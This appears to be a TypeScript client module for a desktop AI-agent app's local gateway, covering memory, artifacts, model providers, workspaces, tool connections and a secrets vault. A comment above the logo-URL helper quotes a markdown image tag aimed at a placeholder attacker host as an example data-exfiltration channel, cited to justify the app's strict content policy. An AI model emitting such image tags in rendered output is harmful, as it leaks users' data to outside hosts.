  return (await response.json()) as ManagedAutomation;
}

async function electronDeleteAutomation(
  id: string,
  workspaceId?: string | null,
): Promise<void> {
  await fetch(
    `${DESKTOP_GATEWAY_URL}/api/automations/${encodeURIComponent(id)}${automationScopeSuffix(
      workspaceId,
    )}`,
    {
      method: "DELETE",
      headers: gatewayHeaders(),
    },
  ).catch(() => undefined);
}

/** One recorded run of an automation — drives the run history + late/failed badge. */
export type CoreAutomationRun = {
  ran_at: number;
  ok: boolean;
  late: boolean;
  detail: string | null;
};

async function electronAutomationRuns(id: string): Promise<CoreAutomationRun[]> {
  try {
    const r = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/automations/${encodeURIComponent(id)}/runs`,
      { headers: gatewayHeaders() },
    );
    if (!r.ok) return [];
    const body = (await r.json()) as { runs?: CoreAutomationRun[] };
    return body.runs ?? [];
  } catch {
    return [];
  }
}

/** The user's persistent brand kit — colours, fonts, logo — applied to deliverables. */
export interface BrandKit {
  organization: string;
  primary_color: string;
  secondary_color: string;
  accent_color: string;
  heading_font: string;
  body_font: string;
  logo_data_url: string;
}

async function electronBrandKit(): Promise<BrandKit> {
  return gatewayGetJson<BrandKit>("/api/brand-kit");
}

async function electronSaveBrandKit(kit: BrandKit): Promise<BrandKit> {
  const r = await fetch(`${DESKTOP_GATEWAY_URL}/api/brand-kit`, {
    method: "PUT",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(kit),
  });
  if (!r.ok) throw new Error(`save brand kit HTTP ${r.status}`);
  return (await r.json()) as BrandKit;
}

/** Thread ids with an in-flight chat answer right now (across ALL threads, not just
 *  the one on screen) — drives the sidebar "working" dots on every busy chat. */
async function electronActiveStreams(): Promise<string[]> {
  try {
    const r = await fetch(`${DESKTOP_GATEWAY_URL}/api/chat/active_streams`, {
      headers: gatewayHeaders(),
    });
    if (!r.ok) return [];
    const data = (await r.json()) as { thread_ids?: string[] };
    return data.thread_ids ?? [];
  } catch {
    return [];
  }
}

async function electronConsolidateMemory(
  workspace?: string,
): Promise<{ merged: number; dropped: number }> {
  const qs = workspace ? `?workspace=${encodeURIComponent(workspace)}` : "";
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/consolidate${qs}`, {
    method: "POST",
    headers: gatewayHeaders(),
  });
  if (!response.ok) {
    throw new Error(`Desktop Gateway memory consolidate HTTP ${response.status}`);
  }
  return response.json() as Promise<{ merged: number; dropped: number }>;
}

async function electronSaveMemoryWiki(
  scope: { thread?: string; workspace?: string },
  path: string,
  body: string,
): Promise<void> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/wiki`, {
    method: "PUT",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ thread: scope.thread, workspace: scope.workspace, path, body }),
  });
  if (!response.ok) {
    throw new Error(`Desktop Gateway memory wiki save HTTP ${response.status}`);
  }
}

async function electronArtifactVersions(thread: string, name: string): Promise<number> {
  const { versions } = await gatewayGetJson<{ versions: number }>(
    `/api/artifacts/versions?thread=${encodeURIComponent(thread)}&name=${encodeURIComponent(name)}`,
  );
  return versions;
}

export interface ArtifactFileView {
  name: string;
  size: number;
  source?: "managed" | "memory" | string | null;
  reference?: string | null;
  project_path?: string | null;
  project_relative_path?: string | null;
  title?: string | null;
}
export interface ArtifactThreadView {
  thread: string;
  title?: string | null;
  workspace_id?: string | null;
  workspace_name?: string | null;
  chat_missing?: boolean;
  bytes: number;
  files: ArtifactFileView[];
}
export interface ArtifactsUsage {
  base_path: string;
  total_bytes: number;
  threads: ArtifactThreadView[];
}
export interface ExportArtifactFileRequest {
  thread: string;
  name: string;
  source?: string | null;
  reference?: string | null;
}

export interface MemoryArtifactView {
  reference: string;
  name: string;
  title: string;
  artifact_type: string;
  source: string;
  project_relative_path?: string | null;
  project_path?: string | null;
  managed_path?: string | null;
  size: number;
  updated: boolean;
  thread: string;
}

export interface ArtifactDestination {
  label: string;
  path: string;
}

async function electronArtifactDestinations(): Promise<ArtifactDestination[]> {
  const { destinations } = await gatewayGetJson<{ destinations: ArtifactDestination[] }>(
    "/api/artifacts/destinations",
  );
  return destinations;
}

async function electronAddArtifactDestination(
  label: string,
  path: string,
): Promise<ArtifactDestination[]> {
  const { destinations } = await gatewayPostJson<{ destinations: ArtifactDestination[] }>(
    "/api/artifacts/destinations",
    { label, path },
  );
  return destinations;
}

async function electronRemoveArtifactDestination(path: string): Promise<ArtifactDestination[]> {
  const response = await fetch(
    `${DESKTOP_GATEWAY_URL}/api/artifacts/destinations?path=${encodeURIComponent(path)}`,
    { method: "DELETE", headers: gatewayHeaders() },
  );
  const { destinations } = (await response.json()) as { destinations: ArtifactDestination[] };
  return destinations;
}

async function electronArtifactsUsage(): Promise<ArtifactsUsage> {
  return gatewayGetJson<ArtifactsUsage>("/api/artifacts/usage");
}

async function electronExportArtifacts(files: ExportArtifactFileRequest[]): Promise<Blob> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/artifacts/export`, {
    method: "POST",
    headers: gatewayHeaders({ "Content-Type": "application/json" }),
    body: JSON.stringify({ files }),
  });
  if (!response.ok) {
    throw new Error(`Export artifacts HTTP ${response.status}`);
  }
  return response.blob();
}

async function electronMemoryArtifacts(thread?: string): Promise<MemoryArtifactView[]> {
  const suffix = thread ? `?thread=${encodeURIComponent(thread)}` : "";
  const { artifacts } = await gatewayGetJson<{ artifacts: MemoryArtifactView[] }>(
    `/api/artifacts/memory${suffix}`,
  );
  return artifacts ?? [];
}

async function electronDeleteArtifactFile(thread: string, name: string): Promise<void> {
  await fetch(
    `${DESKTOP_GATEWAY_URL}/api/artifacts/file?thread=${encodeURIComponent(thread)}&name=${encodeURIComponent(name)}`,
    { method: "DELETE", headers: gatewayHeaders() },
  );
}

async function electronDeleteMemoryArtifact(reference: string): Promise<void> {
  await fetch(
    `${DESKTOP_GATEWAY_URL}/api/artifacts/memory?reference=${encodeURIComponent(reference)}`,
    { method: "DELETE", headers: gatewayHeaders() },
  );
}

async function electronDeleteArtifactThread(thread: string): Promise<void> {
  await fetch(
    `${DESKTOP_GATEWAY_URL}/api/artifacts/thread?thread=${encodeURIComponent(thread)}`,
    { method: "DELETE", headers: gatewayHeaders() },
  );
}

async function electronClearArtifacts(): Promise<void> {
  await gatewayPostJson("/api/artifacts/clear", {});
}

async function electronArtifactFolder(thread: string): Promise<string> {
  const { path } = await gatewayGetJson<{ path: string }>(
    `/api/artifacts/path?thread=${encodeURIComponent(thread)}`,
  );
  return path;
}

async function electronTranscribe(audioBase64: string, language?: string): Promise<string> {
  const { text } = await gatewayPostJson<{ text: string }>("/api/chat/transcribe", {
    audio_base64: audioBase64,
    ...(language ? { language } : {}),
  });
  return text;
}

// ── Per-conversation linked folder ("@ file" context) ─────────────────────

export interface ThreadFolder {
  path: string | null;
}

export interface ThreadFileContent {
  path: string;
  content: string;
  truncated: boolean;
}

async function electronThreadFolder(threadId: string): Promise<ThreadFolder> {
  return gatewayGetJson<ThreadFolder>(
    `/api/chat/threads/${encodeURIComponent(threadId)}/folder`,
  );
}

/** Lists a directory (Workbench File tab). No path → the thread's project folder.
 *  Jailed to authorized roots; `authorized: false` when outside them. */
async function electronFsList(
  path: string | null,
  threadId?: string,
): Promise<FsListResult> {
  const params = new URLSearchParams();
  if (path) params.set("path", path);
  if (threadId) params.set("thread_id", threadId);
  const suffix = params.toString() ? `?${params.toString()}` : "";
  return gatewayGetJson<FsListResult>(`/api/fs/list${suffix}`);
}

/** Reads a file (text + git HEAD version for the diff view). Jailed like fsList. */
async function electronFsFile(path: string, threadId?: string): Promise<FsFilePayload> {
  const params = new URLSearchParams({ path });
  if (threadId) params.set("thread_id", threadId);
  return gatewayGetJson<FsFilePayload>(`/api/fs/file?${params.toString()}`);
}

/** Cancels any non-terminal task (clears stuck/blocked ones); returns the queue. */
async function electronCancelTask(taskId: string): Promise<CoreTaskQueueSnapshot> {
  return gatewayPostJson<CoreTaskQueueSnapshot>(
    `/api/tasks/${encodeURIComponent(taskId)}/cancel`,
    {},
  );
}

async function electronSetThreadFolder(
  threadId: string,
  path: string | null,
): Promise<ThreadFolder> {
  return gatewayPostJson<ThreadFolder>(
    `/api/chat/threads/${encodeURIComponent(threadId)}/folder`,
    { path },
  );
}

async function electronSearchThreadFiles(
  threadId: string,
  query: string,
): Promise<string[]> {
  const { files } = await gatewayGetJson<{ files: string[] }>(
    `/api/chat/threads/${encodeURIComponent(threadId)}/files?q=${encodeURIComponent(query)}`,
  );
  return files;
}

async function electronReadThreadFile(
  threadId: string,
  path: string,
): Promise<ThreadFileContent> {
  return gatewayGetJson<ThreadFileContent>(
    `/api/chat/threads/${encodeURIComponent(threadId)}/file?path=${encodeURIComponent(path)}`,
  );
}

// ── Provider registry (multi-provider inference) ──────────────────────────

export interface ProviderModelView {
  id: string;
  vision: boolean;
  tools: boolean;
  reasoning: boolean;
  modality: string;
  context_window: number | null;
  tier: string | null;
  strengths: string | null;
  profile_source: string | null;
  profile_confidence: number | null;
}

export interface ProviderView {
  id: string;
  label: string;
  kind: string;
  base_url: string;
  enabled: boolean;
  has_key: boolean;
  active_model: string | null;
  models: ProviderModelView[];
  models_fetched_at: string | null;
}

export interface ProvidersResponse {
  active_provider_id: string | null;
  providers: ProviderView[];
}

export interface UpsertProviderInput {
  id?: string;
  label?: string;
  kind?: string;
  base_url: string;
  api_key?: string;
  active_model?: string;
}

async function electronProviders(): Promise<ProvidersResponse> {
  return gatewayGetJson<ProvidersResponse>("/api/providers");
}

async function electronUpsertProvider(input: UpsertProviderInput): Promise<ProvidersResponse> {
  return gatewayPostJson<ProvidersResponse>("/api/providers", input);
}

async function electronRemoveProvider(id: string): Promise<ProvidersResponse> {
  return gatewayDeleteJson<ProvidersResponse>(`/api/providers/${encodeURIComponent(id)}`);
}

async function electronSetProviderEnabled(
  id: string,
  enabled: boolean,
): Promise<ProvidersResponse> {
  return gatewayPostJson<ProvidersResponse>(
    `/api/providers/${encodeURIComponent(id)}/enabled`,
    { enabled },
  );
}

async function electronRefreshProviderModels(id: string): Promise<ProvidersResponse> {
  return gatewayPostJson<ProvidersResponse>(
    `/api/providers/${encodeURIComponent(id)}/models`,
    {},
  );
}

export interface SetModelProfileInput {
  provider_id: string;
  model: string;
  tier: string;
  strengths?: string;
  vision?: boolean;
  tools?: boolean;
  reasoning?: boolean;
  context_window?: number;
}

async function electronSetModelProfile(input: SetModelProfileInput): Promise<ProvidersResponse> {
  return gatewayPostJson<ProvidersResponse>("/api/model-profile", input);
}

async function electronGenerateProviderProfiles(id: string): Promise<ProvidersResponse> {
  return gatewayPostJson<ProvidersResponse>(
    `/api/providers/${encodeURIComponent(id)}/generate-profiles`,
    {},
  );
}

// ── LLM concurrency (ResourceGovernor LlmInference limit) ─────────────────

/** Effective LLM concurrency: the user override (if any) or the locality-inferred
 *  default (loopback 1, cloud 4). `inferred_local` lets the UI warn that a high
 *  override can saturate local VRAM. */
export interface LlmConcurrencyView {
  override: number | null;
  effective: number;
  inferred_local: boolean;
}

async function electronLlmConcurrency(): Promise<LlmConcurrencyView> {
  return gatewayGetJson<LlmConcurrencyView>("/api/runtime/llm-concurrency");
}

async function electronSetLlmConcurrency(
  override: number | null,
): Promise<LlmConcurrencyView> {
  return gatewayPostJson<LlmConcurrencyView>("/api/runtime/llm-concurrency", {
    override,
  });
}

// ── Role → model bindings (per-task model) ────────────────────────────────

export interface RoleView {
  key: string;
  label: string;
  description: string;
  auto: boolean;
  binding_provider_id: string | null;
  binding_model: string | null;
  resolved_provider_id: string | null;
  resolved_model: string | null;
  resolved_kind: string | null;
}

export interface RolesResponse {
  roles: RoleView[];
}

async function electronRoles(): Promise<RolesResponse> {
  return gatewayGetJson<RolesResponse>("/api/roles");
}

export interface RoutingDecision {
  ts: number;
  role: string;
  goal: string;
  candidates: string[];
  chosen_provider: string;
  chosen_model: string;
  stage: string;
}

export interface RoutingDecisionsResponse {
  decisions: RoutingDecision[];
}

async function electronRoutingDecisions(): Promise<RoutingDecisionsResponse> {
  return gatewayGetJson<RoutingDecisionsResponse>("/api/routing-decisions");
}

async function electronSetRole(input: {
  role: string;
  provider_id?: string;
  model?: string;
}): Promise<RolesResponse> {
  return gatewayPostJson<RolesResponse>("/api/roles", input);
}


async function electronSystemStatus(): Promise<SystemStatus> {
  return gatewayGetJson<SystemStatus>("/api/system/status");
}

async function electronCloseAllBrowsers(): Promise<CloseAllBrowsersResult> {
  return gatewayPostJson<CloseAllBrowsersResult>("/api/system/browser/close-all", {});
}

async function electronWorkspaces(): Promise<WorkspacesSnapshot> {
  return gatewayGetJson<WorkspacesSnapshot>("/api/workspaces");
}

async function electronCreateteWorkspace(
  name: string,
  folder: string,
): Promise<WorkspacesSnapshot> {
  return gatewayPostJson<WorkspacesSnapshot>("/api/workspaces", { name, folder });
}

async function electronSetWorkspaceFolder(
  id: string,
  folder: string,
): Promise<WorkspacesSnapshot> {
  return gatewayPostJson<WorkspacesSnapshot>(
    `/api/workspaces/${encodeURIComponent(id)}/folder`,
    { folder },
  );
}

async function electronSelectWorkspace(id: string): Promise<WorkspacesSnapshot> {
  return gatewayPostJson<WorkspacesSnapshot>(
    `/api/workspaces/${encodeURIComponent(id)}/select`,
    {},
  );
}

async function electronRenameWorkspace(id: string, name: string): Promise<WorkspacesSnapshot> {
  return gatewayPostJson<WorkspacesSnapshot>(
    `/api/workspaces/${encodeURIComponent(id)}/rename`,
    { name },
  );
}

async function electronDeleteWorkspace(id: string): Promise<WorkspacesSnapshot> {
  return gatewayPostJson<WorkspacesSnapshot>(
    `/api/workspaces/${encodeURIComponent(id)}/delete`,
    {},
  );
}

async function electronReorderWorkspaces(orderedIds: string[]): Promise<WorkspacesSnapshot> {
  return gatewayPostJson<WorkspacesSnapshot>("/api/workspaces/reorder", {
    ordered_ids: orderedIds,
  });
}
async function electronReorderChatThreads(
  workspaceId: string,
  orderedIds: string[],
): Promise<void> {
  await gatewayPostJson("/api/chat/threads/reorder", {
    workspace_id: workspaceId,
    ordered_ids: orderedIds,
  });
}

// ── Tags (cross-project colored labels) ──────────────────────────────────────────────────
export type TagEntityType = "project" | "thread";
export interface Tag {
  id: string;
  name: string;
  color: string;
  created_at: number;
}
export interface TagEntityRef {
  entity_type: TagEntityType;
  entity_id: string;
}

async function electronListTags(): Promise<Tag[]> {
  return gatewayGetJson<Tag[]>("/api/tags");
}
async function electronCreateTag(name: string, color: string): Promise<Tag> {
  return gatewayPostJson<Tag>("/api/tags", { name, color });
}
async function electronRenameTag(id: string, name: string): Promise<void> {
  await gatewayPostJson(`/api/tags/${encodeURIComponent(id)}/rename`, { name });
}
async function electronSetTagColor(id: string, color: string): Promise<void> {
  await gatewayPostJson(`/api/tags/${encodeURIComponent(id)}/color`, { color });
}
async function electronDeleteTag(id: string): Promise<void> {
  await gatewayPostJson(`/api/tags/${encodeURIComponent(id)}/delete`, {});
}
async function electronAssignTag(
  tagId: string,
  entityType: TagEntityType,
  entityId: string,
): Promise<void> {
  await gatewayPostJson(`/api/tags/${encodeURIComponent(tagId)}/assign`, {
    entity_type: entityType,
    entity_id: entityId,
  });
}
async function electronUnassignTag(
  tagId: string,
  entityType: TagEntityType,
  entityId: string,
): Promise<void> {
  await gatewayPostJson(`/api/tags/${encodeURIComponent(tagId)}/unassign`, {
    entity_type: entityType,
    entity_id: entityId,
  });
}
async function electronTagsForEntity(
  entityType: TagEntityType,
  entityId: string,
): Promise<Tag[]> {
  return gatewayGetJson<Tag[]>(
    `/api/tags/entity/${encodeURIComponent(entityType)}/${encodeURIComponent(entityId)}`,
  );
}
async function electronEntitiesForTag(tagId: string): Promise<TagEntityRef[]> {
  const result = await gatewayGetJson<{ entities: TagEntityRef[] }>(
    `/api/tags/${encodeURIComponent(tagId)}/entities`,
  );
  return result.entities;
}
export interface TagAssignment {
  entity_type: TagEntityType;
  entity_id: string;
  tag: Tag;
}
async function electronAllTagAssignments(): Promise<TagAssignment[]> {
  const result = await gatewayGetJson<{ assignments: TagAssignment[] }>(
    "/api/tags/assignments",
  );
  return result.assignments;
}

// ADR 0023 — per-workspace sandbox/approval override. Mirrors `setRuntimeSettings`: each axis
// is optional and PATCH-merged server-side; sending JSON `null` clears that axis back to
// inheriting the global default (see `merge_workspace_policy` on the gateway). Returns the
// updated record.
async function electronSetWorkspacePolicy(
  id: string,
  patch: {
    sandbox_mode?: string | null;
    approval_policy?: string | null;
    writable_roots?: string[] | null;
    skill_confirmations?: string[] | null;
  },
): Promise<WorkspaceRecord> {
  return gatewayPostJson<WorkspaceRecord>(
    `/api/workspaces/${encodeURIComponent(id)}/policy`,
    patch,
  );
}

async function electronProjectAccess(workspaceId: string): Promise<ProjectAccessGrant[]> {
  return gatewayGetJson<ProjectAccessGrant[]>(
    `/api/workspaces/${encodeURIComponent(workspaceId)}/access`,
  );
}

async function electronUpsertProjectAccess(
  workspaceId: string,
  input: ProjectAccessInput,
): Promise<ProjectAccessGrant[]> {
  return gatewayPostJson<ProjectAccessGrant[]>(
    `/api/workspaces/${encodeURIComponent(workspaceId)}/access/upsert`,
    input,
  );
}

async function electronRemoveProjectAccess(
  workspaceId: string,
  contactReference: string,
  channel: string,
): Promise<ProjectAccessGrant[]> {
  return gatewayPostJson<ProjectAccessGrant[]>(
    `/api/workspaces/${encodeURIComponent(workspaceId)}/access/remove`,
    { contact_reference: contactReference, channel },
  );
}

async function electronMemorySources(
  workspaceId: string,
): Promise<MemorySourceGrantView[]> {
  return gatewayGetJson<MemorySourceGrantView[]>(
    `/api/workspaces/${encodeURIComponent(workspaceId)}/memory-sources`,
  );
}

async function electronMemorySourceCandidates(
  workspaceId: string,
  sourceWorkspaceId: string,
  pagination: MemorySourceCandidatePagination = {},
): Promise<MemorySourceCandidateView[]> {
  const params = new URLSearchParams({ source_workspace_id: sourceWorkspaceId });
  if (pagination.offset !== undefined) params.set("offset", String(pagination.offset));
  if (pagination.limit !== undefined) params.set("limit", String(pagination.limit));
  return gatewayGetJson<MemorySourceCandidateView[]>(
    `/api/workspaces/${encodeURIComponent(workspaceId)}/memory-sources/candidates?${params.toString()}`,
  );
}

async function electronUpsertMemorySource(
  workspaceId: string,
  input: MemorySourceUpsertInput,
): Promise<MemorySourceGrantView[]> {
  return gatewayPostJson<MemorySourceGrantView[]>(
    `/api/workspaces/${encodeURIComponent(workspaceId)}/memory-sources/upsert`,
    input,
  );
}

async function electronRevokeMemorySource(
  workspaceId: string,
  grantId: string,
): Promise<MemorySourceGrantView[]> {
  return gatewayPostJson<MemorySourceGrantView[]>(
    `/api/workspaces/${encodeURIComponent(workspaceId)}/memory-sources/${encodeURIComponent(grantId)}/revoke`,
    {},
  );
}

/** A parameter (env var, argument, or HTTP header) a registry server needs. */
export interface McpRegistryInput {
  key: string;
  target: "arg" | "env" | "header";
  label: string;
  secret: boolean;
  required: boolean;
  default?: string | null;
}

/** A server from the official MCP registry, normalized for one-click connect. */
export interface McpRegistryServer {
  id: string;
  name: string;
  publisher: string;
  description: string;
  official: boolean;
  version: string;
  /** "stdio" (local process) | "http" (remote streamable-HTTP endpoint). */
  transport: string;
  url?: string | null;
  runtime: string;
  command: string;
  args: string[];
  inputs: McpRegistryInput[];
  installable: boolean;
  note?: string | null;
  homepage?: string | null;
}

async function electronMcpRegistry(q?: string): Promise<McpRegistryServer[]> {
  const suffix = q && q.trim() ? `?q=${encodeURIComponent(q.trim())}` : "";
  const payload = await gatewayGetJson<{ servers: McpRegistryServer[] }>(
    `/api/capabilities/mcp/registry${suffix}`,
  );
  return payload.servers ?? [];
}

async function electronMcpDisconnect(providerId: string): Promise<boolean> {
  const payload = await gatewayPostJson<{ removed: boolean }>(
    "/api/capabilities/mcp/disconnect",
    { provider_id: providerId },
  );
  return payload.removed;
}

async function electronMcpConnect(input: {
  name: string;
  command?: string;
  args?: string[];
  env?: Record<string, string>;
  url?: string;
  headers?: Record<string, string>;
}): Promise<McpConnectResult> {
  return gatewayPostJson<McpConnectResult>("/api/capabilities/mcp/connect", {
    name: input.name,
    command: input.command ?? "",
    args: input.args ?? [],
    env: input.env ?? {},
    ...(input.url ? { url: input.url } : {}),
    headers: input.headers ?? {},
  });
}

export type McpConnectedServer = { provider_id: string; name: string; tools: number };

/** All configured MCP servers (NOT derived from discovered tools), so a server
 *  that connected with 0 tools / pending auth still shows in the UI. */
async function electronMcpConnected(): Promise<McpConnectedServer[]> {
  const payload = await gatewayGetJson<{ servers: McpConnectedServer[] }>(
    "/api/capabilities/mcp/connected",
  );
  return payload.servers ?? [];
}

async function electronComposioConnect(apiKey: string): Promise<ComposioConnectResult> {
  return gatewayPostJson<ComposioConnectResult>(
    "/api/capabilities/composio/connect",
    { api_key: apiKey },
  );
}

/** Where to load a toolkit's brand logo from: the GATEWAY, never the remote CDN.
 *
 *  The renderer's CSP allows no remote image origin, and that is deliberate — the app renders
 *  model-generated markdown, where an `<img src="https://attacker/?data=…">` would be a ready-made
 *  exfiltration channel. So the gateway fetches the logo and serves it from loopback, and the CSP stays
 *  free of remote hosts. Unauthenticated by necessity: an `<img>` tag cannot carry the bearer token
 *  (same reason as `/api/ws` and the noVNC assets), and it only ever returns a public brand icon. */
export function composioLogoUrl(slug: string): string {
  return `${DESKTOP_GATEWAY_URL}/api/capabilities/composio/toolkits/${encodeURIComponent(slug)}/logo`;
}

async function electronComposioToolkits(): Promise<ComposioToolkit[]> {
  const payload = await gatewayGetJson<{ toolkits: ComposioToolkit[] }>(
    "/api/capabilities/composio/toolkits",
  );
  return payload.toolkits ?? [];
}

export interface ComposioAuthField {
  name: string;
  label: string;
  required: boolean;
  secret: boolean;
}
export interface ComposioAuthScheme {
  mode: string;
  managed: boolean;
  creation_fields: ComposioAuthField[];
  initiation_fields: ComposioAuthField[];
}
export interface ComposioToolkitAuth {
  slug: string;
  no_auth: boolean;
  schemes: ComposioAuthScheme[];
}

async function electronComposioToolkitAuth(slug: string): Promise<ComposioToolkitAuth> {
  const r = await fetch(
    `${DESKTOP_GATEWAY_URL}/api/capabilities/composio/toolkits/${encodeURIComponent(slug)}/auth`,
    { headers: gatewayHeaders() },
  );
  if (!r.ok) return { slug, no_auth: false, schemes: [] };
  return (await r.json()) as ComposioToolkitAuth;
}

export interface ComposioLinkInput {
  scheme?: string;
  managed?: boolean;
  credentials?: Record<string, string>;
  initiation?: Record<string, string>;
  apiKey?: string;
}

async function electronComposioLink(
  toolkitSlug: string,
  input?: ComposioLinkInput,
): Promise<ComposioLinkResult> {
  return gatewayPostJson<ComposioLinkResult>("/api/capabilities/composio/link", {
    toolkit_slug: toolkitSlug,
    ...(input?.scheme ? { scheme: input.scheme } : {}),
    ...(input?.managed != null ? { managed: input.managed } : {}),
    ...(input?.credentials ? { credentials: input.credentials } : {}),
    ...(input?.initiation ? { initiation: input.initiation } : {}),
    ...(input?.apiKey ? { api_key: input.apiKey } : {}),
  });
}

export interface ComposioExecuteResult {
  ok: boolean;
  summary: string;
}

async function electronComposioExecute(
  tool: string,
  args: unknown,
  scope: "once" | "always",
  ctx?: { threadId?: string; messageId?: string },
): Promise<ComposioExecuteResult> {
  return gatewayPostJson<ComposioExecuteResult>("/api/capabilities/composio/execute", {
    tool,
    arguments: args ?? {},
    scope,
    ...(ctx?.threadId ? { thread_id: ctx.threadId } : {}),
    ...(ctx?.messageId ? { message_id: ctx.messageId } : {}),
  });
}

/** In-chat folder authorization: grant access + run the pending op (list/read).
 *  `ctx` lets the backend rewrite the originating message so the card can't reopen. */
async function electronFsAuthorize(
  path: string,
  op: string,
  ctx?: { threadId?: string; messageId?: string },
): Promise<{ ok: boolean; output?: string; summary?: string }> {
  return gatewayPostJson("/api/fs/authorize", {
    path,
    op,
    ...(ctx?.threadId ? { thread_id: ctx.threadId } : {}),
    ...(ctx?.messageId ? { message_id: ctx.messageId } : {}),
  });
}

/** ADR 0023 — on-failure sandbox escalation: re-run a shell command that failed under
 *  the Seatbelt workspace sandbox with FULL access (unsandboxed). `ctx` lets the backend
 *  rewrite the originating message to a done-note so the card can't reopen. */
async function electronRunEscalate(
  command: string,
  cwd: string,
  ctx?: { threadId?: string; messageId?: string },
): Promise<{ ok: boolean; output?: string; summary?: string }> {
  return gatewayPostJson("/api/capabilities/run/escalate", {
    command,
    cwd,
    ...(ctx?.threadId ? { thread_id: ctx.threadId } : {}),
    ...(ctx?.messageId ? { message_id: ctx.messageId } : {}),
  });
}

export interface VaultProposalActionInput {
  category: string;
  label: string;
  redacted_preview: string;
  pending_id?: string;
  secret_value?: string;
  pin?: string;
  thread_id?: string;
  message_id?: string;
  /** How to resolve a dedup conflict: "add" | "update" | "ignore". */
  resolution?: "add" | "update" | "ignore";
  /** The existing record targeted by an "update"/"ignore" resolution. */
  record_id?: string;
}

export interface VaultProposalAcceptResult {
  ok: boolean;
  /** "created" | "ignored" (identical record already existed) | "conflict". */
  status: string;
  record_id: string;
  category: string;
  label: string;
  redacted_preview: string;
  /** Set on a conflict: "key" (same category+field) or "value" (same value). */
  match_type?: string;
  /** The pre-existing record involved in an "ignored"/"conflict" outcome. */
  existing?: VaultRecordSummary;
}

export interface VaultPinStatus {
  configured: boolean;
}

export interface VaultPinVerifyResult {
  ok: boolean;
}

export interface VaultRecordSummary {
  id: string;
  category: string;
  label: string;
  redacted_preview: string;
}

export interface VaultRecordsListResult {
  records: VaultRecordSummary[];
}

export interface VaultRecordUpdateInput {
  category: string;
  label: string;
  secret_value?: string;
  pin?: string;
}

export interface VaultRecordUpdateResult {
  ok: boolean;
  record: VaultRecordSummary;
}

export interface VaultRecordRevealResult {
  ok: boolean;
  record: VaultRecordSummary;
  secret_value: string;
}

export interface PaymentApprovalSnapshot {
  approval_id: string;
  merchant: string;
  domain: string;
  amount_minor: number;
  currency: string;
  product_summary: string;
  payment_method_label: string;
  checkout_fingerprint: string;
}

export interface PaymentApprovalResult {
  ok: boolean;
  payment_approval_id: string;
  expires_in_seconds: number;
}

async function electronVaultProposalAccept(
  input: VaultProposalActionInput,
): Promise<VaultProposalAcceptResult> {
  return gatewayPostJson<VaultProposalAcceptResult>("/api/vault/proposals/accept", input);
}

async function electronVaultProposalDismiss(
  input: VaultProposalActionInput,
): Promise<{ ok: boolean }> {
  return gatewayPostJson<{ ok: boolean }>("/api/vault/proposals/dismiss", input);
}

async function electronVaultRecords(): Promise<VaultRecordsListResult> {
  return gatewayGetJson<VaultRecordsListResult>("/api/vault/records");
}

async function electronVaultRecordDelete(id: string): Promise<{ ok: boolean }> {
  return gatewayDeleteJson<{ ok: boolean }>(`/api/vault/records/${encodeURIComponent(id)}`);
}

async function electronVaultRecordUpdate(
  id: string,
  input: VaultRecordUpdateInput,
): Promise<VaultRecordUpdateResult> {
  return gatewayPatchJson<VaultRecordUpdateResult>(
    `/api/vault/records/${encodeURIComponent(id)}`,
    input,
  );
}

async function electronVaultRecordReveal(
  id: string,
  pin: string,
): Promise<VaultRecordRevealResult> {
  return gatewayPostJson<VaultRecordRevealResult>(
    `/api/vault/records/${encodeURIComponent(id)}/reveal`,
    { pin },
  );
}

async function electronVaultPinStatus(): Promise<VaultPinStatus> {
  return gatewayGetJson<VaultPinStatus>("/api/vault/pin/status");
}

async function electronVaultPinSetup(
  pin: string,
  currentPin?: string,
): Promise<VaultPinStatus> {
  return gatewayPostJson<VaultPinStatus>("/api/vault/pin/setup", {
    pin,
    ...(currentPin ? { current_pin: currentPin } : {}),
  });
}

async function electronVaultPinVerify(pin: string): Promise<VaultPinVerifyResult> {
  return gatewayPostJson<VaultPinVerifyResult>("/api/vault/pin/verify", { pin });
}

async function electronVaultPaymentApprovalApprove(
  snapshot: PaymentApprovalSnapshot,
  pin: string,
  cvv: string,
  ctx?: { threadId?: string; messageId?: string },
): Promise<PaymentApprovalResult> {
  return gatewayPostJson<PaymentApprovalResult>("/api/vault/payment-approvals/approve", {
    snapshot,
    pin,
    cvv,
    ...(ctx?.threadId ? { thread_id: ctx.threadId } : {}),
    ...(ctx?.messageId ? { message_id: ctx.messageId } : {}),
  });
}

/** Persists that the user connected one suggestion from an in-chat connect-card,
 *  so the item shows "Collegato" on reload instead of re-offering the action. */
async function electronConnectMark(input: {
  kind: string;
  ref: string;
  ctx?: { threadId?: string; messageId?: string };
}): Promise<{ ok: boolean }> {
  return gatewayPostJson("/api/connect/mark", {
    kind: input.kind,
    ref: input.ref,
    ...(input.ctx?.threadId ? { thread_id: input.ctx.threadId } : {}),
    ...(input.ctx?.messageId ? { message_id: input.ctx.messageId } : {}),
  });
}

/** Executes an MCP server tool on user confirmation. `scope: "always"` records a
 *  server-level allow (policy B) so this server's writes stop asking. */
async function electronMcpExecute(
  tool: string,
  args: unknown,
  scope: "once" | "always",
  ctx?: { threadId?: string; messageId?: string },
): Promise<ComposioExecuteResult> {
  return gatewayPostJson<ComposioExecuteResult>("/api/capabilities/mcp/execute", {
    tool,
    arguments: args ?? {},
    ...(scope === "always" ? { allow_server: true } : {}),
    ...(ctx?.threadId ? { thread_id: ctx.threadId } : {}),
    ...(ctx?.messageId ? { message_id: ctx.messageId } : {}),
  });
}

export interface AllowedTool {
  slug: string;
  name: string;
}

async function electronComposioAllowedTools(): Promise<AllowedTool[]> {
  const payload = await gatewayGetJson<{ tools: AllowedTool[] }>(
    "/api/capabilities/composio/allowed-tools",
  );
  return payload.tools ?? [];
}

async function electronComposioRevokeTool(slug: string): Promise<AllowedTool[]> {
  const payload = await gatewayDeleteJson<{ tools: AllowedTool[] }>(
    `/api/capabilities/composio/allowed-tools/${encodeURIComponent(slug)}`,
  );
  return payload.tools ?? [];
}

async function electronComposioConnections(): Promise<ComposioConnection[]> {
  const payload = await gatewayGetJson<{ connections: ComposioConnection[] }>(
    "/api/capabilities/composio/connections",
  );
  return payload.connections ?? [];
}
